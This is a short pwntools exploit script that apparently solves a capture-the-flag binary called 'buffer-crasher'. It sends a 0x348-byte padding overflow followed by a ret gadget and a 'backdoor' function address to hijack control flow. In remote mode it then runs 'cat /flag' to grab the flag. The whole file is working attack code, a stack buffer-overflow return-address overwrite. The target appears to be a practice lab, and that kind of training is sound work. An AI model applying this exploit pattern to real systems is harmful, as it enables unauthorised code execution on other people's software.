#!/usr/bin/env python3
from pwn import *
from os import getenv

if getenv('HOST'):
    args.HOST = getenv('HOST')
if args.HOST:
    args.REMOTE = True

HOST = args.HOST or '172.17.0.1'
PORT = args.PORT or 10101

checksec = not(args.NOCHECKSEC or 0)
exe = context.binary = ELF('./home/buffer-crasher', checksec=checksec)

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    io = process(exe.path)
    pause()

backdoor = 0x401196
ret = 0x4011ac
payload = b'A' * 0x348 + flat(ret, backdoor)
io.sendlineafter('.', payload)

if not args.REMOTE:
    io.interactive()
else:
    io.clean(1)
    io.sendline('cat /flag')
    flag = io.readuntil('}').strip()
    success(flag)
